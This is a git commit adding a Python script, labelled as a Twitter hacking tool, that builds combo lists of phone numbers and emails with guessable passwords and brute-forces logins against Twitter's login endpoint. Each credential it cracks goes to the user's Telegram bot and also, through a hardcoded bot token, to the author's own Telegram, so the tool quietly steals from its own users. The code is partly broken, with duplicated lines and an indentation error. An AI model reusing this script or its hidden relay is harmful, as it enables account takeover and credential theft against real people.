4254d90b52472b93801288340c7db3bcf32df625
vearahmad <69453119+vearahmad@users.noreply.github.com>
2024-01-30 13:53:06 +0300

    Create twit.py

---
+++ twit.py
@@ -0,0 +1,238 @@
+#HACKED TWITTER BY MR,VEAR
+#1,30,2024
+
+import requests
+import json
+import time
+import random
+import sys
+import os
+import requests
+
+user_agent = 'Mozilla/5.0 (Linux; Android 13; M2102J20SG Build/TKQ1.221013.002; wv) AppleWebKit/537.36'
+user_agent = 'Mozilla/5.0 (Linux; Android 13; M2102J20SG Build/TKQ1.221013.002; wv) AppleWebKit/537.36'
+user_agent = 'Mozilla/5.0 (Linux; Android 13; M2102J20SG Build/TKQ1.221013.002; wv) AppleWebKit/537.36'
+user_agent = 'Mozilla/5.0 (Linux; Android 13; M2102J20SG Build/TKQ1.221013.002; wv) AppleWebKit/537.36'
+user_agent = 'Mozilla/5.0 (Linux; Android 13; M2102J20SG Build/TKQ1.221013.002; wv) AppleWebKit/537.36'
+
+# decodey by MR,VEAR
+id_my = '1942678573'
+token_my = '6630350178:AAFsa03A5Ix0H9PJfQP0UPUKgq5Pm7D-GaY'
+os.system('rm -rf Compo.txt')
+num = '''\033[32m 0750
+''' 
+url='https://twitter.com/accounts/login/ajax/'
+headers = {
+    'authority': 'abs.twimg.com',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'origin': 'https://twitter.com',
+    'referer': 'https://twitter.com/',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'script',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',}
+    
+    banek='''\x1b[1;97m
+ [\033[32m1\x1b[1;97m] - Crack RAQAM+PASS
+ [\033[32m2\x1b[1;97m] - Crack RAQAM+RAQAM
+ [\033[32m3\x1b[1;97m] - Crack GMAIL+RAQAM
+ [\033[32m4\x1b[1;97m] - Crack EMAIL+PASS
+ [\033[32m0\x1b[1;97m] - Exit Tool
+'''
+logo = '''\x1b[1;92m
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+BY MR,VEAR🦁
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                                                 '''
+logo2 = '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
+
+def reba(FARA):
+	for e in FARA + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.010)
+
+def menu():
+	os.system('clear')
+	print(logo)
+	print(logo2)
+	print(banek)
+	aco()
+
+def aco():
+	reb = input('---> ')
+	print(num)
+	
+	if reb=='1':
+		sfr = input(' \x1b[1;97mchand bet:\033[32m ')
+		op=open('Compo.txt','w')
+		for x in range(99999):
+			f = "11"
+			f = "12"
+			f = "123"
+			f = "1234"
+			f = "12345"
+			f = "123456"
+			f = "1234567"
+			f = "12345678"
+			f = "123456789"
+			f = "1234567890"
+			f = "12345678910"
+			x1 = random.choice(f)
+			x2 = random.choice(f)
+			x3 = random.choice(f)
+			x4 = random.choice(f)
+			x5 = random.choice(f)
+			x6 = random.choice(f)
+			x7 = random.choice(f)
+			user =x1+x2+x3+x4+x5+x6+x7
+			kk = '+964'+sfr
+			op.write(kk+user+':'+user+'\n')
+		op.close()
+		combo = ('Compo.txt')
+	
+	elif reb=='2':
+		sfr = input(' \x1b[1;97mchand bet:\033[32m ')
+		op=open('Compo.txt','w')
+		for x in range(99999):
+			f = "11"
+			f = "12"
+			f = "123"
+			f = "1234"
+			f = "12345"
+			f = "123456"
+			f = "1234567"
+			f = "12345678"
+			f = "123456789"
+			f = "1234567890"
+			f = "12345678910"
+			x1 = random.choice(f)
+			x2 = random.choice(f)
+			x3 = random.choice(f)
+			x4 = random.choice(f)
+			x5 = random.choice(f)
+			x6 = random.choice(f)
+			x7 = random.choice(f)
+			user =x1+x2+x3+x4+x5+x6+x7
+			kk = '+964'+sfr
+			op.write(kk+user+':'+'0'+sfr+user+'\n')
+		op.close()
+		combo = ('Compo.txt')
+	
+	elif reb=='3':
+		print(' \033[32mname bnosa')
+		sfr = input(' \x1b[1;97mname: \033[32m')
+		op=open('Compo.txt','w')
+		for x in range(99999):
+			f = "11"
+			f = "12"
+			f = "123"
+			f = "1234"
+			f = "12345"
+			f = "123456"
+			f = "1234567"
+			f = "12345678"
+			f = "123456789"
+			f = "1234567890"
+			f = "12345678910"
+			x1 = random.choice(f)
+			x2 = random.choice(f)
+			x3 = random.choice(f)
+			x4 = random.choice(f)
+			x5 = random.choice(f)
+			x6 = random.choice(f)
+			x7 = random.choice(f)
+			kk =sfr+x1+x2+x3+'@gmail.com'
+			op.write(kk+':'+sfr+x1+x2+x3+'\n')
+		op.close()
+		combo = ('Compo.txt')
+	elif reb=='4':
+		print(logo)
+		print(logo2)
+		fg =input(' sdcard Compo: ')
+		combo=fg
+	elif reb=='0':
+		print('[-] Exit tool')
+		sys.exit()
+	else:
+		sys.exit()
+	
+	crack()
+
+
+def crack():
+	r0=0
+	r1=0
+	r2=0
+	r3=0
+	r4=0
+	for x in open('Compo.txt','r').read().splitlines():
+		user = x.split(":")[0]
+		pas = x.split(":")[1]
+		
+		data={'username': user,'enc_password': "#PWD_INSTAGRAM_BROWSER:0:&:"+pas,}
+		reba=requests.post(url, data=data, headers=headers).text
+		if ('"authenticated":true') in reba:
+			r1+=1
+			os.system('clear')
+			
+			print(logo)
+			print(logo2)
+			print('\033[32m OK : '+str(r1))
+			print('\033[93m CP : '+str(r2))
+			print('\033[31m Bad : '+str(r3))
+			print(logo2)
+			sender =user+' : '+pas
+			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender
+			response = requests.get(send_telegram)
+			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + sender
+			responsek = requests.get(send_my)
+			r2+=1
+			os.system('clear')
+			
+			print(logo)
+			print(logo2)
+			print('\033[32m OK : '+str(r1))
+			print('\033[93m CP : '+str(r2))
+			print('\033[31m Bad : '+str(r3))
+			print(logo2)
+		
+		
+			r4+=1
+			os.system('clear')
+		
+			print(logo)
+			print(logo2)
+			print('\033[32m OK : '+str(r1))
+			print('\033[93m CP : '+str(r2))
+			print('\033[31m Bad : '+str(r3))
+			print(logo2)
+			print(reba)
+			time.sleep(50.0)
+			r0=0
+			
+			
+		else:
+			r3+=1
+			os.system('clear')
+			
+			print(logo)
+			print(logo2)
+			print('\033[32m OK : '+str(r1))
+			print('\033[93m CP : '+str(r2))
+			print('\033[31m Bad : '+str(r3))
+			print(logo2)
+
+
+
+
+os.system('clear')
+print(logo)
+print(logo2)
+id_tg =input(' 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃 : ')
+token_bot=input(' 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧 : ')
+time.sleep(0.5)
+menu()
